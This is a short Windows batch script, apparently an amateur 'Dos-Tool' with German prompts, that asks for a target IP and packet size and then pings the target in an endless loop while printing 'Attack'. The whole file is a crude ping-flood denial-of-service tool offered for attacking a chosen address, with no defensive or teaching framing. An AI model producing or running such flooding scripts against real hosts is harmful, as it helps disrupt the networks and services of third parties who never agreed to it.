@echo off
title Dos-Tool
color c
echo Willkommen beim Dos Tool von spacefist!
echo Gib hier deine Angriffs IP ein

set /p IP=IP4:
set /p Puffer=SendePuffer:

:A
Set /a Send=%Send%+1
ping %IP% -l %Puffer% -w 15 -n 1
echo Attack :%IP%:%Puffer%:
goto A 
